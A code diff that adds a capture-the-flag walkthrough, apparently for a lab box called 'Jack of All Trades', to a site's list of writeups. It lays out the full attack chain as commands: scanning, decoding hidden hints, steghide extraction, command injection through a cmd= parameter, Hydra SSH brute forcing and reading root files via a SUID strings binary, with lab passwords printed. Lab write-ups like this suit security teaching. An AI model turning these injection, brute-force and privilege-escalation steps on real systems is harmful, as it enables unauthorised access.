@@ -668,6 +668,155 @@ print(fernet.decrypt(encrypted.encode()).decode())
 </div>
 `
   }
+  {
+    id: "jack-of-all-trades",
+    title: "Jack of All Trades",
+    difficulty: "medium",
+    flags: 2,
+    techniques: ["Port swapping", "Steganography", "CMD injection", "Hydra", "SUID strings"],
+    content: `
+<h1>Jack of All Trades &mdash; Full Walkthrough</h1>
+
+<div class="writeup-meta">
+  <span class="meta-item"><strong>Target:</strong> 10.49.139.173</span>
+  <span class="meta-item"><strong>OS:</strong> Linux (Debian)</span>
+  <span class="meta-item"><strong>Flags:</strong> 2</span>
+  <span class="meta-item"><strong>By:</strong> Komal &middot; Jun 3, 2026</span>
+</div>
+
+<div class="flags-grid">
+  <div class="flag-card"><span class="flag-num">01</span><span class="flag-desc">User flag — visually embedded in user.jpg</span></div>
+  <div class="flag-card"><span class="flag-num">02</span><span class="flag-desc">Root flag — SUID strings read /root/root.txt</span></div>
+</div>
+
+<hr>
+
+<h2>Phase 1: Reconnaissance</h2>
+
+<pre><code>nmap -sC -sV 10.49.139.173 -oN nmap_scan.txt</code></pre>
+
+<table>
+  <tr><th>Port</th><th>Service</th></tr>
+  <tr><td>22/tcp</td><td>HTTP (Apache 2.4.10)</td></tr>
+  <tr><td>80/tcp</td><td>SSH (OpenSSH 6.7p1)</td></tr>
+</table>
+
+<h2>Phase 2: Web Enumeration &mdash; Hidden Clues</h2>
+
+<pre><code>curl -s http://10.49.139.173:22/
+# HTML comments reveal:
+# 1. /recovery.php endpoint
+# 2. Base64 encoded string
+
+echo "&lt;base64_string&gt;" | base64 -d
+# Password: u?WtKSraq</code></pre>
+
+<h2>Phase 3: Recovery Login &mdash; Multi-Layer Decoding</h2>
+
+<p>The <code>/recovery.php</code> page contains a Base32 encoded comment:</p>
+
+<pre><code># Base32 &rArr; Hex
+echo "&lt;base32_string&gt;" | base32 -d
+# Hex output
+
+# Hex &rArr; ROT13 ciphertext
+echo "&lt;hex&gt;" | xxd -r -p
+# ROT13 ciphertext
+
+# ROT13 &rArr; English
+echo "&lt;rot13&gt;" | tr "A-Za-z" "N-ZA-Mn-za-m"
+# Hint: credentials hidden on homepage images</code></pre>
+
+<h2>Phase 4: Steganography &mdash; CMS Credentials</h2>
+
+<pre><code># Download images
+wget http://10.49.139.173:22/assets/stego.jpg
+wget http://10.49.139.173:22/assets/header.jpg
+wget http://10.49.139.173:22/assets/jackinthebox.jpg
+
+# Extract with discovered password
+steghide extract -sf header.jpg
+# Passphrase: u?WtKSraq
+# Extracted: cms.creds
+
+cat cms.creds
+# Username: jackinthebox
+# Password: TplFxiSHjY</code></pre>
+
+<h2>Phase 5: CMS Access &mdash; Remote Code Execution</h2>
+
+<pre><code># Login and get cookie
+curl -v -s -X POST http://10.49.139.173:22/recovery.php \
+  -d "user=jackinthebox&pass=TplFxiSHjY"
+# Redirects to: /nnxhweOV/index.php
+
+# Command injection via cmd= parameter
+curl -s -b "login=cookie" \
+  "http://10.49.139.173:22/nnxhweOV/index.php?cmd=id"
+# uid=33(www-data) gid=33(www-data)
+
+# Discover password list
+curl -s -b "login=cookie" \
+  "http://10.49.139.173:22/nnxhweOV/index.php?cmd=cat /home/jacks_password_list"</code></pre>
+
+<h2>Phase 6: Hydra &mdash; SSH Brute Force</h2>
+
+<pre><code># Save password list & brute force SSH on port 80
+hydra -l jack -P passwords.txt ssh://10.49.139.173:80 -t 4
+# [80][ssh] host: 10.49.139.173   login: jack   password: ITMJpGGIqg1jn?>@</code></pre>
+
+<h2>Phase 7: SSH Access &mdash; User Flag</h2>
+
+<pre><code>ssh jack@10.49.139.173 -p 80
+# Password: ITMJpGGIqg1jn?>@
+
+# Transfer user.jpg and view
+scp -P 80 jack@10.49.139.173:~/user.jpg .
+xdg-open user.jpg
+# Flag visually embedded in the image</code></pre>
+
+<h2>Phase 8: Privilege Escalation &mdash; SUID Strings</h2>
+
+<pre><code># Find SUID binaries
+find / -perm -4000 -type f 2>/dev/null
+# /usr/bin/strings has SUID bit set!
+
+# Read root flag
+/usr/bin/strings /root/root.txt
+# Flag{...}</code></pre>
+
+<hr>
+
+<div class="chain">
+  <span class="chain-step">Swapped ports</span>
+  <span class="chain-arrow">&rarr;</span>
+  <span class="chain-step">HTML secrets</span>
+  <span class="chain-arrow">&rarr;</span>
+  <span class="chain-step">Multi-layer decode</span>
+  <span class="chain-arrow">&rarr;</span>
+  <span class="chain-step">Steganography</span>
+  <span class="chain-arrow">&rarr;</span>
+  <span class="chain-step">CMS RCE</span>
+  <span class="chain-arrow">&rarr;</span>
+  <span class="chain-step">Hydra SSH</span>
+  <span class="chain-arrow">&rarr;</span>
+  <span class="chain-step">SUID strings</span>
+  <span class="chain-arrow">&rarr;</span>
+  <span class="chain-step current">Root shell</span>
+</div>
+
+<div class="takeaways">
+  <h3>Key Takeaways</h3>
+  <ul>
+    <li><strong>Check all HTML comments</strong> &mdash; They often hide paths, encoded data, and passwords</li>
+    <li><strong>Don't trust port numbers</strong> &mdash; Always verify service banners; ports can be swapped</li>
+    <li><strong>Multi-layer encoding</strong> &mdash; Base32 &rArr; Hex &rArr; ROT13: identify encoding before decoding</li>
+    <li><strong>Steganography with discovered passwords</strong> &mdash; Try <code>steghide</code> with every password found</li>
+    <li><strong>SUID binaries are gold</strong> &mdash; Check for unusual SUID binaries with <code>find / -perm -4000</code></li>
+  </ul>
+</div>
+`
+  },
 ];
 
 // ===========================
